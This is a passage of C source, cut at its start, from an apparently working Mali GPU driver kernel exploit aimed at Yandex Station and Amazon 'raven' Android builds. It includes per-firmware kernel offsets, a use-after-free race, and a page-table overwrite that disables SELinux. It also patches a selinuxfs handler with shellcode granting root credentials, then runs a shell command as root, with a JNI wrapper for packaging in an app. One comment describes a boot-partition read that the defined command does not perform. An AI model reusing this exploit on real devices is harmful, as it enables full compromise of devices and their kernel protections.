        curr_overwrite_addr = overwrite_addr;
        write_to(mali_fd, overwrite_addr + data_offset, value, atom_number++, type);
        usleep(300000);
      }
    }
  }
}

void write_func(int mali_fd, uint64_t func, uint64_t* reserved, uint64_t size, uint32_t* shellcode, uint64_t code_size) {
  uint64_t func_offset = (func + KERNEL_BASE) % 0x1000;
  uint64_t curr_overwrite_addr = 0;
  for (int i = 0; i < size; i++) {
    uint64_t base = reserved[i];
    uint64_t end = reserved[i] + RESERVED_SIZE * 0x1000;
    uint64_t start_idx = compute_pt_index(base, 3);
    uint64_t end_idx = compute_pt_index(end, 3);
    for (uint64_t addr = base; addr < end; addr += 0x1000) {
      uint64_t overwrite_addr = set_addr_lv3(addr);
      if (curr_overwrite_addr != overwrite_addr) {
        LOG("overwrite addr : %llx %llx\n", overwrite_addr + func_offset, func_offset);
        curr_overwrite_addr = overwrite_addr;
        for (int code = code_size - 1; code >= 0; code--) {
          write_to(mali_fd, overwrite_addr + func_offset + code * 4, shellcode[code], atom_number++, MALI_WRITE_VALUE_TYPE_IMMEDIATE_32);
        }
        usleep(300000);
      }
    }
  }
}
/*
int run_enforce() {
  char result = '2';
  sleep(3);
  int enforce_fd = open("/sys/fs/selinux/enforce", O_RDONLY);
  read(enforce_fd, &result, 1);
  close(enforce_fd);
  LOG("result %d\n", result);
  return result;
}
*/

int run_enforce() {
  char result = '2';
  sleep(3);
  int enforce_fd = open("/sys/fs/selinux/reject_unknown", O_RDONLY);
  read(enforce_fd, &result, 1);
  close(enforce_fd);
  LOG("result %d\n", result);
  return result;
}


/*
 * Offsets for the Yandex Station Max image that this build runs: kernel
 * 4.9.113-g985a1e6b, text at physical 0x1080000.  Taken from the symbols of
 * the matching Image, so the shell the payload builds calls the real
 * commit_creds with init_cred.
 */
#define YNDX_INIT_CRED 0x164b268
#define YNDX_COMMIT_CREDS 0x4c1e0
/*
 * The anchor is the handler of the selinuxfs node that reports the
 * prototype-policy check.  That node is present in this build's policy and
 * reading it enters the handler directly in the reading task's context, which
 * is what the payload needs: an entry point the reader reaches on its own
 * stack.  The handler for the unknown-handle node is not registered here, so
 * it cannot anchor anything.
 */
#define YNDX_SEL_READ_ANCHOR 0x36c578
#define YNDX_SELINUX_ENFORCING 0x189352c
#define YNDX_ADD_INIT 0x9109a000	//add x0, x0, #0x268
#define YNDX_ADD_COMMIT 0x91078108	//add x8, x8, #0x1e0
#define YNDX_AVC_DENIED 0x361d80


static void select_offset_yndx_ref(void) {
  selinux_enforcing = YNDX_SELINUX_ENFORCING;
  sel_read_anchor = YNDX_SEL_READ_ANCHOR;
  avc_deny = YNDX_AVC_DENIED;
  fixup_root_shell(YNDX_INIT_CRED, YNDX_COMMIT_CREDS, YNDX_SEL_READ_ANCHOR,
                   YNDX_ADD_INIT, YNDX_ADD_COMMIT);
}

void select_offset() {
  char fingerprint[PROP_VALUE_MAX] = {0};
  __system_property_get("ro.build.fingerprint", fingerprint);
  LOG("fingerprint: %s\n", fingerprint);
  if (!strcmp(fingerprint,
              "Yandex/yandexstation_2/yandexstation_2:9/PPR1.180610.011/20220415:user/release-keys")) {
    select_offset_yndx_ref();
    return;
  }
  if (!strcmp(fingerprint,
              "Yandex/yandexstation_2/yandexstation_2:9/PPR1.180610.011/20210326:user/release-keys")) {
    LOG("20210326: bootstrap offsets (upstream 20220415 ref until extract)\n");
    select_offset_yndx_ref();
    return;
  }
  if (!strcmp(fingerprint,
              "Yandex/yandexstation_2/yandexstation_2:9/PPR1.180610.011/5000000896:user/release-keys")) {
    /* porting/0896_offsets.h — verified root on 0896 2026-11-16 */
    LOG("0896: offsets from porting/0896_offsets.h\n");
    selinux_enforcing = 0x189352c;
    sel_read_anchor = 0x36c578;
    avc_deny = 0x361d80;
    fixup_root_shell(0x164b268, 0x4c1e0, 0x36c578, 0x9109a000, 0x91078108);
    return;
  }
    if (!strcmp(fingerprint,
              "Yandex/yandexstation_2/yandexstation_2:9/PPR1.180610.011/5000001080:user/release-keys")) {
    LOG("1080: bootstrap offsets (from 0896 port until extract)\n");
    selinux_enforcing = 0x189352c;
    sel_read_anchor = 0x36c578;
    avc_deny = 0x361d80;
    fixup_root_shell(0x164b268, 0x4c1e0, 0x36c578, 0x9109a000, 0x91078108);
    return;
  }
  errx(1, "refusing UAF probe on an unverified Yandex build");
}

void select_offset_raven_unused() {
  char fingerprint[256];
  int len = __system_property_get("ro.build.fingerprint", fingerprint);
  LOG("fingerprint: %s\n", fingerprint);
 
  if (!strcmp(fingerprint, "Amazon/raven/raven:7.0/PS7201/942N:user/amz-p,release-keys")) {
    selinux_enforcing = SELINUX_ENFORCING_7201_942;
    sel_read_anchor = SEL_READ_ANCHOR_7201_942;
    fixup_root_shell(INIT_CRED_7201_942, COMMIT_CREDS_7201_942, SEL_READ_ANCHOR_7201_942, ADD_INIT_7201_942, ADD_COMMIT_7201_942);
    return;  
  } 

  if (!strcmp(fingerprint, "Amazon/raven/raven:7.0/PS7204/1044N:user/amz-p,release-keys")) {
    selinux_enforcing = SELINUX_ENFORCING_7204_1044;
    sel_read_anchor = SEL_READ_ANCHOR_7204_1044;
    fixup_root_shell(INIT_CRED_7204_1044, COMMIT_CREDS_7204_1044, SEL_READ_ANCHOR_7204_1044, ADD_INIT_7204_1044, ADD_COMMIT_7204_1044);
    return;  
  } 

  if (!strcmp(fingerprint, "Amazon/raven/raven:7.0/PS7204/1046N:user/amz-p,release-keys")) {
    selinux_enforcing = SELINUX_ENFORCING_7204_1046;
    sel_read_anchor = SEL_READ_ANCHOR_7204_1046;
    fixup_root_shell(INIT_CRED_7204_1046, COMMIT_CREDS_7204_1046, SEL_READ_ANCHOR_7204_1046, ADD_INIT_7204_1046, ADD_COMMIT_7204_1046);
    return;  
  } 
  
  if (!strcmp(fingerprint, "Amazon/raven/raven:7.0/PS7206/1098N:user/amz-p,release-keys")) {
    selinux_enforcing = SELINUX_ENFORCING_7206_1098;
    sel_read_anchor = SEL_READ_ANCHOR_7206_1098;
    fixup_root_shell(INIT_CRED_7206_1098, COMMIT_CREDS_7206_1098, SEL_READ_ANCHOR_7206_1098, ADD_INIT_7206_1098, ADD_COMMIT_7206_1098);
    return;  
  } 
   
  if (!strcmp(fingerprint, "Amazon/raven/raven:7.0/PS7212/1333N:user/amz-p,release-keys")) {
    selinux_enforcing = SELINUX_ENFORCING_7212_1333;
    sel_read_anchor = SEL_READ_ANCHOR_7212_1333;
    fixup_root_shell(INIT_CRED_7212_1333, COMMIT_CREDS_7212_1333, SEL_READ_ANCHOR_7212_1333, ADD_INIT_7212_1333, ADD_COMMIT_7212_1333);
    return;  
  } 
  
  if (!strcmp(fingerprint, "Amazon/raven/raven:7.0/PS7212/1335N:user/amz-p,release-keys")) {
    selinux_enforcing = SELINUX_ENFORCING_7212_1335;
    sel_read_anchor = SEL_READ_ANCHOR_7212_1335;
    fixup_root_shell(INIT_CRED_7212_1335, COMMIT_CREDS_7212_1335, SEL_READ_ANCHOR_7212_1335, ADD_INIT_7212_1335, ADD_COMMIT_7212_1335);
    return;  
  } 
  
  if (!strcmp(fingerprint, "Amazon/raven/raven:7.0/PS7216/1582N:user/amz-p,release-keys")) {
    selinux_enforcing = SELINUX_ENFORCING_7216_1582;
    sel_read_anchor = SEL_READ_ANCHOR_7216_1582;
    fixup_root_shell(INIT_CRED_7216_1582, COMMIT_CREDS_7216_1582, SEL_READ_ANCHOR_7216_1582, ADD_INIT_7216_1582, ADD_COMMIT_7216_1582);
    return;  
  } 
  
  if (!strcmp(fingerprint, "Amazon/raven/raven:7.0/PS7224/1752N:user/amz-p,release-keys")) {
    selinux_enforcing = SELINUX_ENFORCING_7224_1752;
    sel_read_anchor = SEL_READ_ANCHOR_7224_1752;
    fixup_root_shell(INIT_CRED_7224_1752, COMMIT_CREDS_7224_1752, SEL_READ_ANCHOR_7224_1752, ADD_INIT_7224_1752, ADD_COMMIT_7224_1752);
    return;  
  } 

  if (!strcmp(fingerprint, "Amazon/raven/raven:7.0/PS7229/1850N:user/amz-p,release-keys")) {
    selinux_enforcing = SELINUX_ENFORCING_7229_1850;
    sel_read_anchor = SEL_READ_ANCHOR_7229_1850;
    fixup_root_shell(INIT_CRED_7229_1850, COMMIT_CREDS_7229_1850, SEL_READ_ANCHOR_7229_1850, ADD_INIT_7229_1850, ADD_COMMIT_7229_1850);
    return;  
  } 

  if (!strcmp(fingerprint, "Amazon/raven/raven:7.0/PS7229/1853N:user/amz-p,release-keys")) {
    selinux_enforcing = SELINUX_ENFORCING_7229_1853;
    sel_read_anchor = SEL_READ_ANCHOR_7229_1853;
    fixup_root_shell(INIT_CRED_7229_1853, COMMIT_CREDS_7229_1853, SEL_READ_ANCHOR_7229_1853, ADD_INIT_7229_1853, ADD_COMMIT_7229_1853);
    return;  
  } 
  
  if (!strcmp(fingerprint, "Amazon/raven/raven:7.0/PS7229/1856N:user/amz-p,release-keys")) {
    selinux_enforcing = SELINUX_ENFORCING_7229_1856;
    sel_read_anchor = SEL_READ_ANCHOR_7229_1856;
    fixup_root_shell(INIT_CRED_7229_1856, COMMIT_CREDS_7229_1856, SEL_READ_ANCHOR_7229_1856, ADD_INIT_7229_1856, ADD_COMMIT_7229_1856);
    return;  
  }
  
    if (!strcmp(fingerprint, "Amazon/raven/raven:7.0/PS7234/2039N:user/amz-p,release-keys")) {
    selinux_enforcing = SELINUX_ENFORCING_7234_2039;
    sel_read_anchor = SEL_READ_ANCHOR_7234_2039;
    fixup_root_shell(INIT_CRED_7234_2039, COMMIT_CREDS_7234_2039, SEL_READ_ANCHOR_7234_2039, ADD_INIT_7234_2039, ADD_COMMIT_7234_2039);
    return;  
  }
  
    if (!strcmp(fingerprint, "Amazon/raven/raven:7.0/PS7234/2042N:user/amz-p,release-keys")) {
    selinux_enforcing = SELINUX_ENFORCING_7234_2042;
    sel_read_anchor = SEL_READ_ANCHOR_7234_2042;
    fixup_root_shell(INIT_CRED_7234_2042, COMMIT_CREDS_7234_2042, SEL_READ_ANCHOR_7234_2042, ADD_INIT_7234_2042, ADD_COMMIT_7234_2042);
    return;  
  }

  if (!strcmp(fingerprint, "Amazon/raven/raven:7.0/PS7242/2216N:user/amz-p,release-keys")) {
    selinux_enforcing = SELINUX_ENFORCING_7242_2216;
    sel_read_anchor = SEL_READ_ANCHOR_7242_2216;
    fixup_root_shell(INIT_CRED_7242_2216, COMMIT_CREDS_7242_2216, SEL_READ_ANCHOR_7242_2216, ADD_INIT_7242_2216, ADD_COMMIT_7242_2216);
    return;  
  } 

 if (!strcmp(fingerprint, "Amazon/raven/raven:7.0/PS7242/2896N:user/amz-p,release-keys")) {
    selinux_enforcing = SELINUX_ENFORCING_7242_2896;
    sel_read_anchor = SEL_READ_ANCHOR_7242_2896;
    fixup_root_shell(INIT_CRED_7242_2896, COMMIT_CREDS_7242_2896, SEL_READ_ANCHOR_7242_2896, ADD_INIT_7242_2896, ADD_COMMIT_7242_2896);
    return;  
  } 

  if (!strcmp(fingerprint, "Amazon/raven/raven:7.0/PS7242/2906N:user/amz-p,release-keys")) {
    selinux_enforcing = SELINUX_ENFORCING_7242_2906;
    sel_read_anchor = SEL_READ_ANCHOR_7242_2906;
    fixup_root_shell(INIT_CRED_7242_2906, COMMIT_CREDS_7242_2906, SEL_READ_ANCHOR_7242_2906, ADD_INIT_7242_2906, ADD_COMMIT_7242_2906);
    return;  
  } 

  if (!strcmp(fingerprint, "Amazon/raven/raven:7.0/PS7242/3515N:user/amz-p,release-keys")) {
    selinux_enforcing = SELINUX_ENFORCING_7242_3515;
    sel_read_anchor = SEL_READ_ANCHOR_7242_3515;
    fixup_root_shell(INIT_CRED_7242_3515, COMMIT_CREDS_7242_3515, SEL_READ_ANCHOR_7242_3515, ADD_INIT_7242_3515, ADD_COMMIT_7242_3515);
    return;  
  } 

  if (!strcmp(fingerprint, "Amazon/raven/raven:7.0/PS7242/3516N:user/amz-p,release-keys")) {
    selinux_enforcing = SELINUX_ENFORCING_7242_3516;
    sel_read_anchor = SEL_READ_ANCHOR_7242_3516;
    fixup_root_shell(INIT_CRED_7242_3516, COMMIT_CREDS_7242_3516, SEL_READ_ANCHOR_7242_3516, ADD_INIT_7242_3516, ADD_COMMIT_7242_3516);
    return;  
  } 

  if (!strcmp(fingerprint, "Amazon/raven/raven:7.0/PS7273/2625N:user/amz-p,release-keys")) {
    selinux_enforcing = SELINUX_ENFORCING_7273_2625;
    sel_read_anchor = SEL_READ_ANCHOR_7273_2625;
    fixup_root_shell(INIT_CRED_7273_2625, COMMIT_CREDS_7273_2625, SEL_READ_ANCHOR_7273_2625, ADD_INIT_7273_2625, ADD_COMMIT_7273_2625);
    return;  
  } 

  if (!strcmp(fingerprint, "Amazon/raven/raven:9/PS7279.2766N/0023253929472:user/amz-p,release-keys")) {
    selinux_enforcing = SELINUX_ENFORCING_7279_2766;
    sel_read_anchor = SEL_READ_ANCHOR_7279_2766;
    fixup_root_shell(INIT_CRED_7279_2766, COMMIT_CREDS_7279_2766, SEL_READ_ANCHOR_7279_2766, ADD_INIT_7279_2766, ADD_COMMIT_7279_2766);
    return;  
  } 

  if (!strcmp(fingerprint, "Amazon/raven/raven:9/PS7285.2877N/0023723719936:user/amz-p,release-keys")) {
    selinux_enforcing = SELINUX_ENFORCING_7285_2877;
    sel_read_anchor = SEL_READ_ANCHOR_7285_2877;
    fixup_root_shell(INIT_CRED_7285_2877, COMMIT_CREDS_7285_2877, SEL_READ_ANCHOR_7285_2877, ADD_INIT_7285_2877, ADD_COMMIT_7285_2877);
    return;  
  } 

  if (!strcmp(fingerprint, "Amazon/raven/raven:9/PS7285.2880N/0023723720704:user/amz-p,release-keys")) {
    selinux_enforcing = SELINUX_ENFORCING_7285_2880;
    sel_read_anchor = SEL_READ_ANCHOR_7285_2880;
    fixup_root_shell(INIT_CRED_7285_2880, COMMIT_CREDS_7285_2880, SEL_READ_ANCHOR_7285_2880, ADD_INIT_7285_2880, ADD_COMMIT_7285_2880);
    return;  
  } 

  if (!strcmp(fingerprint, "Amazon/raven/raven:9/PS7292.2982N/0024126400000:user/amz-p,release-keys")) {
    selinux_enforcing = SELINUX_ENFORCING_7292_2982;
    sel_read_anchor = SEL_READ_ANCHOR_7292_2982;
    fixup_root_shell(INIT_CRED_7292_2982, COMMIT_CREDS_7292_2982, SEL_READ_ANCHOR_7292_2982, ADD_INIT_7292_2982, ADD_COMMIT_7292_2982);
    return;  
  } 

  if (!strcmp(fingerprint, "Amazon/raven/raven:9/PS7292.2984N/0024126400512:user/amz-p,release-keys")) {
    selinux_enforcing = SELINUX_ENFORCING_7292_2984;
    sel_read_anchor = SEL_READ_ANCHOR_7292_2984;
    fixup_root_shell(INIT_CRED_7292_2984, COMMIT_CREDS_7292_2984, SEL_READ_ANCHOR_7292_2984, ADD_INIT_7292_2984, ADD_COMMIT_7292_2984);
    return;  
  } 

  if (!strcmp(fingerprint, "Amazon/raven/raven:9/PS7603.3110N/0025065956864:user/amz-p,release-keys")) {
    selinux_enforcing = SELINUX_ENFORCING_7603_3110;
    sel_read_anchor = SEL_READ_ANCHOR_7603_3110;
    fixup_root_shell(INIT_CRED_7603_3110, COMMIT_CREDS_7603_3110, SEL_READ_ANCHOR_7603_3110, ADD_INIT_7603_3110, ADD_COMMIT_7603_3110);
    return;  
  } 

  if (!strcmp(fingerprint, "Amazon/raven/raven:9/PS7608.3614N/0025468739072:user/amz-p,release-keys")) {
    selinux_enforcing = SELINUX_ENFORCING_7608_3614;
    sel_read_anchor = SEL_READ_ANCHOR_7608_3614;
    fixup_root_shell(INIT_CRED_7608_3614, COMMIT_CREDS_7608_3614, SEL_READ_ANCHOR_7608_3614, ADD_INIT_7608_3614, ADD_COMMIT_7608_3614);
    return;  
  } 

  if (!strcmp(fingerprint, "Amazon/raven/raven:9/PS7614.3227N/0025938402048:user/amz-p,release-keys")) {
    selinux_enforcing = SELINUX_ENFORCING_7614_3227;
    sel_read_anchor = SEL_READ_ANCHOR_7614_3227;
    fixup_root_shell(INIT_CRED_7614_3227, COMMIT_CREDS_7614_3227, SEL_READ_ANCHOR_7614_3227, ADD_INIT_7614_3227, ADD_COMMIT_7614_3227);
    return;  
  }  
  
  if (!strcmp(fingerprint, "Amazon/raven/raven:9/PS7624.3337N/0026810845440:user/amz-p,release-keys")) {
    selinux_enforcing = SELINUX_ENFORCING_7624_3337;
    sel_read_anchor = SEL_READ_ANCHOR_7624_3337;
    fixup_root_shell(INIT_CRED_7624_3337, COMMIT_CREDS_7624_3337, SEL_READ_ANCHOR_7624_3337, ADD_INIT_7624_3337, ADD_COMMIT_7624_3337);
    return;  
  }  
  
  if (!strcmp(fingerprint, "Amazon/raven/raven:9/PS7633.3445N/0027347744000:user/amz-p,release-keys")) {
    selinux_enforcing = SELINUX_ENFORCING_7633_3445;
    sel_read_anchor = SEL_READ_ANCHOR_7633_3445;
    fixup_root_shell(INIT_CRED_7633_3445, COMMIT_CREDS_7633_3445, SEL_READ_ANCHOR_7633_3445, ADD_INIT_7633_3445, ADD_COMMIT_7633_3445);
    return;  
  }

  err(1, "unable to match build id\n");
}

void cleanup(int mali_fd, uint64_t pgd) {
  write_to(mali_fd, pgd + OVERWRITE_INDEX * sizeof(uint64_t), 2, atom_number++, MALI_WRITE_VALUE_TYPE_IMMEDIATE_64);
}

void write_selinux(int mali_fd, uint64_t pgd, uint64_t* reserved) {
  uint64_t selinux_enforcing_addr = (((selinux_enforcing + KERNEL_BASE) >> PAGE_SHIFT) << PAGE_SHIFT)| 0x443;
  LOG("selinux_enforcing_phys=%llx entry=%llx\n", selinux_enforcing + KERNEL_BASE, selinux_enforcing_addr);
  write_to(mali_fd, pgd + OVERWRITE_INDEX * sizeof(uint64_t), selinux_enforcing_addr, atom_number++, MALI_WRITE_VALUE_TYPE_IMMEDIATE_64);
  LOG("SELINUX_ENTRY_SET\n");

  usleep(100000);
  write_data(mali_fd, selinux_enforcing, reserved, TOTAL_RESERVED_SIZE/RESERVED_SIZE, 0, MALI_WRITE_VALUE_TYPE_IMMEDIATE_32);
}

/*
 * The handler chosen is reached by a plain read of the selinuxfs node that
 * reports whether the access vector check runs on the prototype policy.  It
 * runs on the reading process's stack in that process's context, so swapping
 * the credentials there grants them to this process alone, and its four
 * argument shape is what the frame below preserves.  Hooks taken on paths the
 * rest of the kernel also uses change identity for every task that passes
 * them, which destabilises the system instead of granting anything.
 */
void write_shellcode(int mali_fd, uint64_t pgd, uint64_t* reserved) {
  uint64_t target_addr = (((sel_read_anchor + KERNEL_BASE) >> PAGE_SHIFT) << PAGE_SHIFT) | 0x443;
  LOG("target_phys=%llx entry=%llx code=%08x %08x %08x %08x\n",
      sel_read_anchor + KERNEL_BASE, target_addr, root_code[0],
      root_code[1], root_code[2], root_code[3]);
  write_to(mali_fd, pgd + OVERWRITE_INDEX * sizeof(uint64_t), target_addr,
           atom_number++, MALI_WRITE_VALUE_TYPE_IMMEDIATE_64);
  LOG("HOOK_ENTRY_SET\n");
  usleep(100000);
  write_func(mali_fd, sel_read_anchor, reserved,
             TOTAL_RESERVED_SIZE / RESERVED_SIZE, &(root_code[0]),
             sizeof(root_code) / sizeof(uint32_t));
  LOG("HOOK_WRITTEN\n");
}

/*
 * The sprayed allocations are kept in two parallel arrays: gpu_regions holds
 * the CPU mapping of each raw allocation, alias_regions the CPU mapping of the
 * aliased view built later.  fault_pages touches both, so a mapping written to
 * the wrong array leaves one of them null and faults on first dereference.
 */
void spray(int mali_fd) {
    for (int j = 0; j < SPRAY_NUM; j++) {
        union kbase_ioctl_mem_alloc alloc = {0};
        alloc.in.flags = BASE_MEM_PROT_CPU_RD | BASE_MEM_PROT_GPU_RD | BASE_MEM_PROT_CPU_WR; // | (1 << 22);
        alloc.in.va_pages = SPRAY_PAGES;
        alloc.in.commit_pages = 0;
        mem_alloc(mali_fd, &alloc);
        gpu_va[j] = alloc.out.gpu_va;
    }
    for (int j = 0; j < SPRAY_NUM; j++) {
      mem_commit(mali_fd, gpu_va[j], SPRAY_PAGES);
    }

    for (int j = 0; j < SPRAY_NUM; j++) {
        void* region = mmap64(NULL, 0x1000 * SPRAY_PAGES, PROT_READ | PROT_WRITE, MAP_SHARED, mali_fd, gpu_va[j]);
      if (region == MAP_FAILED) {
        err(1, "gpu_alloc_region mmap failed");
      }
      gpu_regions[j] = region;
    }
}

int trigger(int mali_fd, int mali_fd2, int *flush_idx) {
  uint64_t gpu_alloc_region = 0;
  /*
   * Both counters are deliberately the file-scope ones.  kbase requires an
   * atom number that is unique among the jobs still pending in a context, and
   * trigger() is entered again for every retry, so a counter that restarts at
   * one hands the driver a duplicate number on the second pass.  The submit
   * then blocks forever in kbase_jd_submit waiting for the slot to free and
   * the whole process lands in uninterruptible sleep.
   */
  uint64_t gpu_alloc_addr = map_gpu(mali_fd, 1, 1, false, 0);
  void *gpu_alloc_region_map = mmap64(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, mali_fd, gpu_alloc_addr);
  if (gpu_alloc_region_map == MAP_FAILED) {
    err(1, "gpu_alloc_region mmap failed");
  }
  gpu_alloc_region = (uint64_t)gpu_alloc_region_map;
  uint64_t jit_pages = SPRAY_PAGES;
  uint64_t jit_addr = jit_allocate(mali_fd, atom_number, jit_id, jit_pages, (uint64_t)gpu_alloc_addr, (uint64_t*)gpu_alloc_region);
  atom_number++;
  mem_flags_change(mali_fd, (uint64_t)jit_addr, BASE_MEM_DONT_NEED, 0);

  for (int i = 0; i < NUM_TRIALS; i++) {
    union kbase_ioctl_mem_query query = {0};
    query.in.gpu_addr = jit_addr;
    query.in.query = KBASE_MEM_QUERY_COMMIT_SIZE;
    int slot_idx = i + *flush_idx;
    flush_regions[slot_idx] = flush(SPRAY_CPU, slot_idx);
    errno = 0;
    if (ioctl(mali_fd, KBASE_IOCTL_MEM_QUERY, &query) < 0) {
      int jit_query_errno = errno;
      union kbase_ioctl_mem_query control = {0};
      control.in.gpu_addr = gpu_alloc_addr;
      control.in.query = KBASE_MEM_QUERY_COMMIT_SIZE;
      errno = 0;
      int control_rc = ioctl(mali_fd, KBASE_IOCTL_MEM_QUERY, &control);
      int control_errno = errno;
      LOG("eviction oracle: jit_errno=%d control_rc=%d control_errno=%d control_commit=%llu\n",
          jit_query_errno, control_rc, control_rc < 0 ? control_errno : 0,
          control.out.value);
      if (jit_query_errno != EINVAL || control_rc < 0 || control.out.value != 1)
        err(1, "JIT eviction oracle lacks a valid non-JIT control");
      migrate_to_cpu(SPRAY_CPU);
      spray(mali_fd);
      LOG("region freed %d\n", i);
      uint64_t alias_region = alias_sprayed_regions(mali_fd);
      fault_pages();
      LOG("cleanup flush region\n");
      /*
       * Only this pass's region is unmapped: every earlier pass already
       * released its own, and unmapping a region again after the reclaim has
       * handed its page to a page table tears the GPU tables down under the
       * driver, which wedges the device rather than failing the pass.
       */
      int slot = i + *flush_idx;
      if (flush_regions[slot] != NULL && flush_regions[slot] != MAP_FAILED)
        munmap(flush_regions[slot], FLUSH_SIZE);
      flush_regions[slot] = NULL;

      LOG("stage=drain_pool\n");
      uint64_t drain = drain_mem_pool(mali_fd);
      LOG("stage=release_pool drain=%llx\n", drain);
      release_mem_pool(mali_fd, drain);
      LOG("stage=post_eviction_jit_free id=%u atom=%u\n", jit_id, atom_number);
      jit_free(mali_fd, atom_number, jit_id);
      LOG("stage=reserve_pages\n");

      reserve_pages(mali_fd, RESERVED_SIZE, TOTAL_RESERVED_SIZE/RESERVED_SIZE, &(reserved[0]));
      LOG("stage=find_freed_idx\n");

      int freed_idx = find_freed_idx(mali_fd);
      if (freed_idx == -1) err(1, "Failed to find freed_idx");
      LOG("UAF_BACKING_LOSS_OBSERVED freed_idx=%d\n", freed_idx);
      atom_number++;
      /*
       * The table to edit is the one the reclaim left behind, so it is found
       * inside the alias of the freed allocation rather than assumed from the
       * layout.  A store into that table repoints an entry at a kernel page,
       * and the reserved pages then write through that entry: writing is the
       * only direction that reaches kernel memory from here, so the payload is
       * put into memory rather than read out of it.
       */
      int pgd_idx = find_pgd(freed_idx, 0);
      uint64_t pgd = alias_region + pgd_idx * 0x1000 + freed_idx * (SPRAY_PAGES * 0x1000);
      LOG("PGD_CANDIDATE index=%d gpu_va=%llx\n", pgd_idx, pgd);
      write_selinux(mali_fd, pgd, &(reserved[0]));
      LOG("SELINUX_WRITE_DONE\n");
      write_shellcode(mali_fd, pgd, &(reserved[0]));
      /*
       * The hook runs on the reading task's stack, so this process reads the
       * node itself: the read enters the overwritten handler and returns with
       * this task's credentials replaced by the initial ones.
       */
      int hfd = open("/sys/fs/selinux/checkreqprot", O_RDONLY);
      LOG("trigger_node_open=%d\n", hfd);
      if (hfd >= 0) {
        char hbuf[16];
        int n = read(hfd, hbuf, sizeof(hbuf) - 1);
        LOG("trigger_node_read=%d\n", n);
        close(hfd);
      }
      /*
       * The redirect is undone before anything else runs: while it stands, the
       * entry points at kernel text, and the graphics driver would use it for
       * its own work as soon as this process stops driving it.
       */
      cleanup(mali_fd, pgd);
      LOG("PGD_RESTORED\n");
      /*
       * The library caches a process's identity at start-up, so the changed
       * credentials are observed by a process that starts after the read:
       * re-exec and let the new process use them.
       */
      /*
       * What the new process does with the credentials is the part worth
       * editing.  The default reads the boot partition, which is mode 0600
       * root and therefore out of reach of the shell user, and leaves a copy
       * the shell can read; nothing is written back to the device.
       *
       * Run as a command string rather than an argument vector so that the
       * shell, not this process, expands and sequences the steps.
       */
      /*
       * The command is supplied by the build so the same payload can start any
       * program that needs root; the default just reports device state. A
       * generated header is used rather than a -D because a command string
       * contains characters the command processor would otherwise act on.
       */
#ifdef ROOT_PAYLOAD_CMD_FROM_FILE
#include "payload_cmd.h"
#else
#define ROOT_PAYLOAD_CMD \
        "id; getenforce;" \
        "echo === SND ===; ls -l /dev/snd/;" \
        "echo 1 > /sys/fs/selinux/enforce;" \
        "getenforce"
#endif
      const char* payload = ROOT_PAYLOAD_CMD;
      LOG("reexec\n");
      execl("/system/bin/sh", "sh", "-c", payload, (char*)NULL);
      err(1, "re-exec failed");
    }
  }
  LOG("failed, retry with new JIT id.\n");
  jit_id++;
  *flush_idx += NUM_TRIALS;
  /*
   * The array of released regions is fixed size, so the window offset has to
   * stay inside it across retries; a run that keeps missing would otherwise
   * index past the end and corrupt the pointers the trigger relies on.
   */
  if (*flush_idx > FLUSH_REGION_SIZE - NUM_TRIALS - 1)
    *flush_idx = 0;
  return -1;
}

#ifdef SHELL

int main() {
  setbuf(stdout, NULL);
  setbuf(stderr, NULL);

  select_offset();
  int mali_fd = open_dev(MALI);

  setup_mali(mali_fd, 0);

  void* tracking_page = setup_tracking_page(mali_fd);
  jit_init(mali_fd, 0x1000, 100, 0);


  int mali_fd2 = open_dev(MALI);
  setup_mali(mali_fd2, 1);
  setup_tracking_page(mali_fd2);
  uint64_t drain = drain_mem_pool(mali_fd2);
  release_mem_pool(mali_fd2, drain);

  /*
   * The UAF window is a race: the reclaim of the freed JIT backing page by a
   * page table does not succeed on every pass, and a pass that misses simply
   * runs out of flush slots.  Give the race enough attempts that a miss is
   * reported as a miss rather than being cut short by the loop bound.
   */
  int flush_idx = 0;
  for (int i = 0; i < 100; i++) {
    if (!trigger(mali_fd, mali_fd2, &flush_idx)) {
      LOG("YANDEX_UAF_PROBE_COMPLETE\n");
      break;
    }
  }

  /*
   * Release everything this process still holds.  Each run allocates a
   * hundred-odd mappings, a hundred-page JIT heap and two GPU contexts; if
   * they are left behind, the next run starts against a depleted VA allocator
   * and a fragmented pool, and failures inside the trigger accumulate across
   * runs until the device no longer survives a run at all.
   */
  for (int r = 0; r < SPRAY_NUM; r++) {
    if (gpu_regions[r] != NULL) {
      munmap(gpu_regions[r], 0x1000 * SPRAY_PAGES);
      gpu_regions[r] = NULL;
    }
    if (alias_regions[r] != NULL) {
      munmap(alias_regions[r], 0x1000 * SPRAY_PAGES);
      alias_regions[r] = NULL;
    }
  }
  if (tracking_page != NULL && tracking_page != MAP_FAILED)
    munmap(tracking_page, 0x1000);

  close(mali_fd);
  close(mali_fd2);
  LOG("YANDEX_PROBE_CLEAN_EXIT\n");
  return 0;
}
#include <jni.h>
JNIEXPORT int JNICALL
Java_com_example_hellojni_MaliExpService_stringFromJNI( JNIEnv* env, jobject thiz)
{
    setbuf(stdout, NULL);
    setbuf(stderr, NULL);

    select_offset();
    int mali_fd = open_dev(MALI);

    setup_mali(mali_fd, 0);

    void* tracking_page = setup_tracking_page(mali_fd);
    jit_init(mali_fd, 0x1000, 100, 0);

    int mali_fd2 = open_dev(MALI);
    setup_mali(mali_fd2, 1);
    setup_tracking_page(mali_fd2);

    int flush_idx = 0;
    for (int i = 0; i < 10; i++) {
        if(!trigger(mali_fd, mali_fd2, &flush_idx)) {
            LOG("uid: %d euid %d", getuid(), geteuid());
            return 0;
        }
    }
    return -1;
}
#endif

